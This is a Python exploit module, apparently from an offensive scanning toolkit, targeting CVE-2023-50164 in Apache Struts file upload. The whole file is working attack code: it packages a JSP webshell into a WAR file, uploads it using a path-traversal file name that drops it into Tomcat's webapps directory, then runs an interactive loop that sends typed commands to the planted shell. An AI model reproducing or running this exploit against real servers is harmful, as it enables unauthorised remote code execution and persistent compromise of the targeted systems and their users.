#!/user/bin/env python3
# -*- coding: utf-8 -*-
import os
import time
import string
import random
import requests
import urllib3
from urllib.parse import urlparse, urlunparse
from requests_toolbelt import MultipartEncoder
from requests.exceptions import ConnectionError
from pub.com.outprint import OutPrintInfoSuc
from pub.com.output import OutPutFile
urllib3.disable_warnings()
MAX_ATTEMPTS = 10
DELAY_SECONDS = 1
HTTP_UPLOAD_PARAM_NAME = "upload"
CATALINA_HOME = "/opt/tomcat/"
NAME_OF_WEBSHELL = "inttest"
NAME_OF_WEBSHELL_WAR = NAME_OF_WEBSHELL + ".war"
NUMBER_OF_PARENTS_IN_PATH = 2
batch_work_apache = False

def get_base_url(url):
    parsed_url = urlparse(url)
    base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, "", "", "", ""))
    return base_url

def create_war_file():
    if not os.path.exists(f"./result/{NAME_OF_WEBSHELL_WAR}"):
        os.system("jar -cvf ./result/{} {}".format(NAME_OF_WEBSHELL_WAR, NAME_OF_WEBSHELL+'.jsp'))
        if not batch_work_apache:
            print("[+] WAR file created successfully.")
    else:
        if not batch_work_apache:
            print("[+] WAR file already exists.")

def upload_file(url):
    create_war_file()

    if not os.path.exists(f"./result/{NAME_OF_WEBSHELL_WAR}"):
        if not batch_work_apache:
            print("[-] ERROR: inttest.war not found in the current directory.")
        return False

    war_location = '../' * (NUMBER_OF_PARENTS_IN_PATH-1) + '..' + \
        CATALINA_HOME + 'webapps/' + NAME_OF_WEBSHELL_WAR

    war_file_content = open(f"./result/{NAME_OF_WEBSHELL_WAR}", "rb").read()

    files = {
        HTTP_UPLOAD_PARAM_NAME.capitalize(): ("arbitrary.txt", war_file_content, "application/octet-stream"),
        HTTP_UPLOAD_PARAM_NAME+"FileName": war_location
    }

    boundary = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
    m = MultipartEncoder(fields=files, boundary=boundary)
    headers = {"Content-Type": m.content_type}

    try:
        response = requests.post(url, headers=headers, data=m,verify=False)
        OutPrintInfoSuc("Apache",f"{NAME_OF_WEBSHELL_WAR} uploaded successfully.")
        if batch_work_apache:
            OutPutFile("apache_2023_50164.txt",f"{NAME_OF_WEBSHELL_WAR} uploaded successfully.")
        return True
    except requests.RequestException as e:
        if not batch_work_apache:
            print("[-] Error while uploading the WAR webshell:", e)
        return False

def attempt_connection(url):
    for attempt in range(1, MAX_ATTEMPTS + 1):
        try:
            r = requests.get(url,verify=False)
            if r.status_code == 200:
                print('[+] Successfully connected to the web shell.')
                return True
            else:
                raise Exception
        except ConnectionError:
            if attempt == MAX_ATTEMPTS:
                if not batch_work_apache:
                    print(f'[-] Maximum attempts reached. Unable to establish a connection with the web shell. Exiting...')
                return False
            time.sleep(DELAY_SECONDS)
        except Exception:
            if attempt == MAX_ATTEMPTS:
                if not batch_work_apache:
                    print('[-] Maximum attempts reached. Exiting...')
                return False
            time.sleep(DELAY_SECONDS)
    return False

def start_interactive_shell(url):
    if not attempt_connection(url):
        return

    while True:
        try:
            cmd = input("\033[91mCMD\033[0m > ")
            if cmd == 'exit':
                raise KeyboardInterrupt
            r = requests.get(url + "?cmd=" + cmd, verify=False)
            if r.status_code == 200:
                print(r.text.replace('\n\n', ''))
            else:
                raise Exception
        except KeyboardInterrupt:
            return
        except ConnectionError:
            print('[-] We lost our connection to the web shell. Exiting...')
            return
        except:
            print('[-] Something unexpected happened. Exiting...')
            return
class Cve_2023_50164:
    def main(self,target):
        batch_work_apache = target["batch_work"]
        url = target["url"].strip('/ ')

        if not url.startswith("http"):
            print("[-] ERROR: Invalid URL. Please provide a valid URL starting with 'http' or 'https'.")
            return
        if not batch_work_apache:
            print("[+] Starting exploitation...")
        flag = upload_file(url)

        webshell_url = f"{get_base_url(url)}/{NAME_OF_WEBSHELL}/{NAME_OF_WEBSHELL}.jsp"
        if not batch_work_apache:
            print(f"[+] Reach the JSP webshell at {webshell_url}?cmd=<COMMAND>")

            print(f"[+] Attempting a connection with webshell.")

        if not batch_work_apache:
            if flag:
                start_interactive_shell(webshell_url)